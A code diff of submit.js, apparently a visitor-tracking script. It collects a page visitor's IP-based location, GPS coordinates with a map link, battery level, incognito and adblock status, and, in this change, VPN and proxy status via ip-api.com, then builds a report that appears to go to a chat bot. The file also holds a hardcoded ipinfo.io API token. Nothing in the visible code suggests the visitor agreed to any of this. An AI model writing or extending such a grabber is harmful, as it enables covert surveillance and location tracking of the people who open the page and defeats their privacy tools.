@@ -1,4 +1,4 @@
-// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section + proper bold/italic Markdown + VPN/Proxy detection)
+// submit.js (updated: added working VPN/Proxy detection using ip-api.com)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -158,17 +158,6 @@ async function collectAndSend(chatId) {
     return { detected, method, cookiesBlocked };
   }
 
-  // VPN / Proxy detection (basic via IP info)
-  async function detectVPN(ipOrg) {
-    // Simple heuristic: look for common VPN / proxy keywords in org name
-    const vpnKeywords = ['VPN', 'Virtual', 'Proxy', 'Nord', 'ExpressVPN', 'Private', 'HideMy', 'Cloudflare', 'Mullvad', 'OVH', 'DigitalOcean'];
-    if (!ipOrg || ipOrg === 'Unknown') return 'Unknown';
-    for (let keyword of vpnKeywords) {
-      if (ipOrg.toLowerCase().includes(keyword.toLowerCase())) return 'Yes';
-    }
-    return 'No';
-  }
-
   const [incognitoResult, adblockResult, geoResult] = await Promise.all([
     detectIncognito(),
     detectAdblockAndCookies(),
@@ -194,7 +183,7 @@ async function collectAndSend(chatId) {
     })()
   ]);
 
-  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown', vpn='Unknown';
+  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown', vpn='Unknown', proxy='Unknown';
   try {
     const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
     if (res.ok) {
@@ -204,12 +193,18 @@ async function collectAndSend(chatId) {
       region = d.region || region;
       country = d.country || country;
       org = d.org || org;
-      vpn = await detectVPN(org);
+
+      // VPN/Proxy detection using ip-api.com
+      try {
+        const vpnRes = await fetch(`http://ip-api.com/json/${ip}?fields=mobile,hosting,proxy`);
+        if (vpnRes.ok) {
+          const v = await vpnRes.json();
+          vpn = (v.proxy || v.hosting) ? 'Yes' : 'No';
+          proxy = v.proxy ? 'Yes' : 'No';
+        }
+      } catch (e) {}
     }
   } catch (e) {}
-
-  // Map view logic
-  const mapView = (geoResult.status === 'Allowed') ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}` : 'Unavailable';
 
   // Build message with Markdown formatting
   const message = 
@@ -240,18 +235,21 @@ async function collectAndSend(chatId) {
 - City: ${city}
 - Region: ${region}
 - Country: ${country}
-- VPN / Proxy: ${vpn}
 _𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚖𝚊𝚢 𝚗𝚘𝚝 𝚋𝚎 𝚊𝚌𝚌𝚞𝚛𝚊𝚝𝚎._
 
 📌 *GPS:*
 - Status: ${geoResult.status}
-${geoResult.status === 'Allowed' ? `- Latitude: \`${geoResult.latitude}\`\n- Longitude: \`${geoResult.longitude}\`\n- Map View: ${mapView}` : `- Map View: ${mapView}`}
+- Latitude: \`${geoResult.latitude}\`
+- Longitude: \`${geoResult.longitude}\`
+- Map View: ${geoResult.status === 'Allowed' ? `https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}` : 'Unavailable'}
 
 🔐 *Privacy & Blockers Info:*
 - Incognito / Private Mode: ${incognitoResult}
 - Adblocker Detected: ${adblockResult.detected}
 - Method: ${adblockResult.method}
 - Cookies Blocked: ${adblockResult.cookiesBlocked}
+- VPN Detected: ${vpn}
+- Proxy Detected: ${proxy}
 
 🔋 *Battery:*
 - Level: ${batteryLevel}
